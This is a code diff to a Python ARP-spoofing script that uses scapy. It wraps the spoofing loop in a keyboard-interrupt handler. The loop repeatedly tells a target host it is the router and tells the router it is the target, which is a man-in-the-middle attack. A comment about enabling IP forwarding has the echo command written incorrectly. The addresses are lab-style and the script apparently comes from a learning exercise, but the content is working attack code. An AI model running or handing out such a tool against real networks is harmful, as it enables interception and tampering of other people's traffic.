@@ -46,11 +46,14 @@ def spoof(target_ip , spoof_ip):
 	scapy.send(packet, verbose = False)
 
 packets_sent = 0
-while True:
-	spoof("10.0.2.8","10.0.2.1")	#tell target we are the router
-	spoof("10.0.2.1","10.0.2.8")	#tell router we are the target
-	packets_sent += 2
-	print("\r[+] Sent "+str(packets_sent)+" packets"),
-	sys.stdout.flush()
-	time.sleep(2)
+try:
+	while True:
+		spoof("10.0.2.8","10.0.2.1")	#tell target we are the router
+		spoof("10.0.2.1","10.0.2.8")	#tell router we are the target
+		packets_sent += 2
+		print("\r[+] Sent "+str(packets_sent)+" packets"),
+		sys.stdout.flush()
+		time.sleep(2)
+except KeyboardInterrupt:
+	print("[+] Exiting program...")
 	#echo > 1 /proc/sys/net/ipv4/ip_forward to enable ip forwarding (so target can still use internet)
